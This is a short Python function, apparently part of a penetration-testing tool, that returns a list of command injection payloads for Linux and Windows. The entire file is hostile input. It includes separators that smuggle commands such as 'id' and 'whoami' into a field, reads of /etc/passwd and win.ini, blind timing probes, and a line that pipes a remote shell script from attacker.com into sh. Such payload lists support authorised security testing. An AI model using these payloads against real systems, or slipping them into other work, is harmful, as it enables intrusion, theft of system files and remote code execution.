def generate_cmdi():
    """
    Generates a list of Command Injection payloads for Linux and Windows, including blind detection and file operations.
    """
    payloads = [
        # Linux payloads
        "; id",
        "&& whoami",
        "| cat /etc/passwd",
        "$(uname -a)",
        "`id`",

        # Windows payloads
        "| whoami",
        "|| ver",
        "& ipconfig",

        # Blind detection examples
        "; sleep 5",
        "| ping -c 5 127.0.0.1",
        "& timeout /t 5 > nul",

        # File operations
        "; cat /etc/passwd",
        "| type C:\\Windows\\win.ini",
        "&& curl http://attacker.com/shell.sh | sh"
    ]
    return payloads
